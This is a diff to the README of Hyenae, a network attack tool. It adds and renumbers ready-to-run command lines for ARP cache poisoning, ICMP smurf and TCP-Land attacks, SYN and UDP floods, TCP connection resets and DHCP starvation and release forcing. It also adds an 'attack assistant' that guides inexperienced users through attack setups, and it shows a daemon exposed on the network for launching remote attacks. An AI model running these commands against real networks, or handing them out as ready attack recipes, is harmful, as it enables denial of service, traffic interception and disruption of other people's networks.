@@ -51,6 +51,7 @@
     > 2. fw0
     > 3. en1
     > 4. lo0
+  * Finished: 4 network interfaces found
 
   You may provide the network interface either by name, using -i argument, or by
   index, using -I argument. On Windows-based operating systems,  you should use
@@ -78,6 +79,7 @@
     > dhcp-discover
     > dhcp-request
     > dhcp-release
+  * Finished: 9 attack protocols available
 
   You can provide the attack protocol by its name (-a). The attack protocols
   use different address patterns and in certain cases, may require additional
@@ -102,6 +104,10 @@
     # hyenae -I 3 -a arp-request -s % -d ff:ff:ff:ff:ff:ff \
     # -S %-% -D 00:00:00:00:00:00-192.168.0.1
 
+    NOTE:
+    The hardware address strip of the source and the sender address pattern
+    will be equaly randomized to avoid corrupt packets.
+
     5.2 ARP-Cache Poisoning
 
     This example will send an ARP-Reply packet from a fictional source address
@@ -116,9 +122,16 @@
     10000 from a random source to a fictional target.
 
     # hyenae -I 3 -a icmp-echo -s %-% -d 00:f0:21:03:c6:00-192.168.0.1 \
-    # -c 1 -c 10000
+    # -c 1 -C 10000
 
-    5.4 ICMP TCP-Reset Attack
+    5.4 ICMP-Smurf Attack
+    This example will send an unlimited amount of ICMP-Echo packets from an
+    existing source address against a network broadcast address.
+
+    # hyenae -I 3 -a icmp-echo -s 00:f0:21:03:c6:00-192.168.0.1 \
+    # -d ff:ff:ff:ff:ff:ff-255.255.255.255
+
+    5.5 ICMP Based TCP-Connection Reset
 
     This example will send a single ICMP "Destination Unreachable" packet with
     the message code "Port unreachable", from a fictional source to a fictional
@@ -131,9 +144,9 @@
     # -d 00:f0:21:03:c6:00-192.168.0.1 \
     # -S 00:c0:33:d4:03:06-192.168.0.2@1093 \
     # -D 00:f0:21:03:c6:00-192.168.0.1@21 \
-    # -c 1
+    # -C 1
 
-    5.4 TCP-SYN Attack
+    5.6 TCP-SYN Attack
 
     This example will send an unlimited amount of TCP packets with set SYN flag,
     from a random source to a fictional target, with a random send delay between
@@ -142,7 +155,15 @@
     # hyenae -I 3 -a tcp -f s -s %-%@%%%% -d 00:f0:21:03:c6:00-192.168.0.1@21 \
     # -e 1 -E 1000
 
-    5.5 Blind TCP Brute-RST Attack
+    5.7 TCP-Land Attack
+
+    This example will send a single TCP packet with set SYN flag and an
+    identical source and destination address.
+
+    # hyenae -I 3 -a tcp -f s -s 00:f0:21:03:c6:00-192.168.0.1@139 \
+    # -d -d 00:f0:21:03:c6:00-192.168.0.1@139 -C 1
+
+    5.8 Blind TCP-Connection Reset
 
     This example will send an unlimited amount of TCP packets with set RST
     flag, from a fictional random source to a fictional target, with an
@@ -151,14 +172,14 @@
     # hyenae -I 3 -a tcp -f r -s 00:c0:33:d4:03:06-192.168.0.2@1093 \
     # -d 00:f0:21:03:c6:00-192.168.0.1@21 -q 1 -Q 1
 
-    5.6 UDP-Flood
+    5.9 UDP-Flood
 
     This example will send an unlimited amount of UDP packets with a random
     payload of 100 Byte, from a fictional random source to a fictional target.
 
     # hyenae -I 3 -a udp -s %-%@%%%% -d 00:f0:21:03:c6:00-192.168.0.1@130 -p 100
 
-    5.7 DHCP-Discover Flood
+    5.10 DHCP-Discover Flood
 
     This example will send an unlimited amount of DHCP-Discover packets from a
     random source to all available machines on the network. The second example
@@ -170,7 +191,7 @@
     # hyenae -I 3 -a dhcp-discover -s %-0.0.0.0 \
     # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -S 192.168.%.%%
 
-    5.8 DHCP-Starvation Attack
+    5.11 DHCP-Starvation Attack
 
     This example will send an unlimited amount of DHCP-Request packets from a
     random source to all available machines on the network. The DHCP-Option
@@ -182,20 +203,34 @@
     # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -D 192.168.0.1
 
     # hyenae -I 3 -a dhcp-request -s %-0.0.0.0 \
-    # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -D 192.168.0.1 -S %
+    # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -S % -D 192.168.0.1
 
-    5.9 DHCP-Release Forcing
+    5.12 DHCP-Release Forcing
 
     This example will send a single DHCP-Release packet from a fictional source
     address to a fictional DHCP-Server. The DHCP-Option "Server Identifier" is
     set to the IP-Address of the destination DHCP-Server.
 
     # hyenae -I 3 -a dhcp-release -s 11:22:33:44:55:66-192.168.0.2 \
-    # -d 44:55:66:77:88:99-192.168.0.1 -D 192.168.0.1 -c 1
+    # -d 44:55:66:77:88:99-192.168.0.1 -D 192.168.0.1 -C 1
 
 --------------------------------------------------------------------------------
 
-  6. Setting Up the Hyenae Daemon
+  6. Starting the attack assistant
+
+  Since Hyenaes range of arguments makes it a very powerfull tool to experienced
+  network specialists and administrators, it can be way to complex for
+  unexperienced users. In order to provide an easy way to set up attack
+  scenarios without having deeper knowledge of the attack procedural itself,
+  Hyenae features a text based attack assistant that will guide unexperienced
+  users through the setup of common attack scenarios. You can activate the
+  attack assistant by simply starting Hyenae without any argument.
+
+  # hyenae
+
+--------------------------------------------------------------------------------
+
+  7. Setting Up the Hyenae Daemon
 
   Hyenae comes with a daemon for setting up remote attacks. The daemon can be
   started with just a few arguments. The only required arguments are the network
@@ -209,15 +244,28 @@
   * Starting daemon
   * Opening network interface (en1)
   * Binding server to 127.0.0.1@666
-  * Hyenae Daemon v0.26-2: Online
+  * Hyenae Daemon v0.31-1: Online
 
   If the port argument is unspecified, the daemon will listen on port 666 by
   default. Alternatively, you can specify the port to listen on with the -p
   argument.
 
+  By default the Hyenae daemon will bind it's server socket to the loopback
+  interface of your machine. If you want to make the daemon available to other
+  network clients, you have to specify the IP-Address of the network interface
+  you want to bind to instead by using the -a argument.
+
+  # hyenaed -I 3 -a 192.168.0.2 -u 10000
+
+  * Initializing
+  * Starting daemon
+  * Opening network interface (en1)
+  * Binding server to 192.168.0.2@666
+  * Hyenae Daemon v0.31-1: Online
+
 --------------------------------------------------------------------------------
 
-  7. Starting a Remote Attack
+  8. Starting a Remote Attack
 
   Starting a remote attack is similar to starting a local one. However, instead
   of defining a network interface to operate on, you will need to specify the
